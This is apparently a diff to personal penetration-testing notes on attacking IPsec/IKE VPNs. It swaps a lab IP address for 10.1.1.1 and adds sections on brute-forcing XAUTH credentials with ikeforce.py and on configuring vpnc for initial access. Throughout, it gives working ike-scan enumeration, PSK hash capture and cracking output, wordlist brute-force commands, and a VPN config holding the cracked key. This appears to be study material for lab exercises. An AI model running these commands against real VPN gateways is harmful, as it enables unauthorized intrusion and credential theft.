@@ -3,10 +3,10 @@
 REF: https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html#finding-a-valid-transformation
 
 N.B. using a spurious Group ID (fakeID) to enumerate the real Group ID will output a fake hash, example below.
-ike-scan -P -M -A -n fakeID 10.129.95.215
+ike-scan -P -M -A -n fakeID 10.1.1.1
 
 Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
-10.129.95.215   Aggressive Mode Handshake returned
+10.1.1.1   Aggressive Mode Handshake returned
         HDR=(CKY-R=62ce9a71e9e9cc96)
         SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
         KeyExchange(128 bytes)
@@ -24,7 +24,7 @@ Ending ike-scan 1.9.6: 1 hosts scanned in 0.184 seconds (5.45 hosts/sec).  1 ret
 
 ## When you have a Group ID get a Hash
 
-ike-scan -M -A -n example@test.com --pskcrack=hash.txt 10.129.95.215
+ike-scan -M -A -n example@test.com --pskcrack=hash.txt 10.1.1.1
 
 ## Crack the Hash
 
@@ -38,5 +38,31 @@ key "freakingrockstarontheroad" matches SHA1 hash 40f080deecd07851ebef67f360b064
 Ending psk-crack: 8045040 iterations in 28.151 seconds (285781.55 iterations/sec)
 ```
 
+## XAUTH Bruting
+
+Use the Group ID and PSK to brute the XAUTH user/pass. Lists can be used for username and password.
+
+./ikeforce.py 10.1.1.1 -b -i example@test.com -u root -k freakingrockstarontheroad -w /usr/share/wordlists/rockyou.txt  -s 1
+
+./ikeforce.py 10.1.1.1 -b -i example@test.com -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -k freakingrockstarontheroad -w /usr/share/wordlists/rockyou.txt -s 1
+
+
+## Combine it all together for initial access
+
+### VPNC config
+
+cat > /etc/vpnc/samplevpn.conf << STOP
+IPSec gateway 10.1.1.1
+IPSec ID example@test.com
+IPSec secret freakingrockstarontheroad
+IKE Authmode psk
+Xauth username [VPN_USERNAME]
+Xauth password [VPN_PASSWORD]
+STOP
+
+### VPNC usage
+root@system:~# vpnc samplevpn
+VPNC started in background (pid: [PID])...
+root@system:~# ifconfig tun0
 
 
